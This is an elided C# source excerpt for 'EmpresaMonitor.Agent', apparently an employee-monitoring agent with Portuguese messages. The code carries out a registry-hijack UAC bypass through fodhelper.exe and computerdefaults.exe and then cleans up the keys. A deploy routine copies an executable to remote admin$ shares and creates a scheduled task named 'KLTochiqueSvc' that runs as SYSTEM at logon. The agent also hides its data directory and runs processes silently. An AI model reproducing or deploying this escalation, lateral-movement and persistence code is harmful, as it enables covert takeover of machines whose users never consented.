...
namespace EmpresaMonitor.Agent
{
    internal static class Program
    {
        ...
        {
            ("fodhelper.exe", @"Software\Classes\ms-settings\Shell\Open\command"),
            ("computerdefaults.exe", @"Software\Classes\ComputerDefaults\Shell\Open\command")
        };
        ...
        static void Main()
        {
            ...
            using var singleInstance = new Mutex(true, @"Local\EmpresaMonitor.Agent.Runner", out bool createdNew);
        ...
        static bool TryElevateVia(string exeName, string regPath)
        {
            try
            {
                string payload = $"\"{Environment.ProcessPath ?? "EmpresaMonitor.Agent.exe"}\" --elevated";
        ...
        static bool WaitElevatedCopy(int timeoutMs)
        {
            try
            {
                using var ev = new EventWaitHandle(false, EventResetMode.ManualReset, @"Local\EmpresaMonitor.Agent.ElevatedReady", out _);
        ...
        static void SignalElevatedReady()
        {
            try
            {
                using var ev = new EventWaitHandle(true, EventResetMode.ManualReset, @"Local\EmpresaMonitor.Agent.ElevatedReady", out _);
            }
            catch { }
        }
        ...
        {
            try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\Shell\Open\command", false); } catch { }
            try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ComputerDefaults\Shell\Open\command", false); } catch { }
        }
        ...
        static async Task HandleDeployAsync(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            ...
            if (!IsElevated())
            {
                await SendJsonAsync(socket, state.SendGate, new { type = "deploy_result", requestId, ok = false, log, error = "O Agent precisa estar elevado (Administrador/SYSTEM) para copiar para admin$ e agendar a tarefa." });
                return;
            }

            var destFile = $@"\\{target}\admin$\Temp\{Path.GetFileName(exe)}";
            ...
            {
                await SendJsonAsync(socket, state.SendGate, new { type = "deploy_result", requestId, ok = false, log, error = $"Falha ao copiar para admin$: {Short(ex.Message, 300)}" });
                return;
            }

            var cred = string.IsNullOrEmpty(user) ? "" : $" /U {user} /P {pass}";
            var (createCode, createOut, createErr) = RunHidden("schtasks.exe",
                $"/Create /S {target} /RU SYSTEM /TN \"KLTochiqueSvc\" /TR \"\\\"{destFile}\\\" --silent\" /SC ONLOGON /F{cred}", 25_000);
            log.Add(createCode == 0
                ? "OK: tarefa KLTochiqueSvc criada (SYSTEM)."
                : $"schtasks /Create: exit {createCode} — {Short(createErr.Length > 0 ? createErr : createOut, 300)}");

            if (createCode == 0)
            {
                var (runCode, _, runErr) = RunHidden("schtasks.exe", $"/Run /S {target} /TN \"KLTochiqueSvc\"{cred}", 25_000);
                log.Add(runCode == 0
        ...
        {
            var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EmpresaMonitor", "data");
            Directory.CreateDirectory(dir);
            try { new DirectoryInfo(dir).Attributes |= FileAttributes.Hidden; } catch { }
            var path = Path.Combine(dir, "ident.dat");
            if (File.Exists(path))
            {
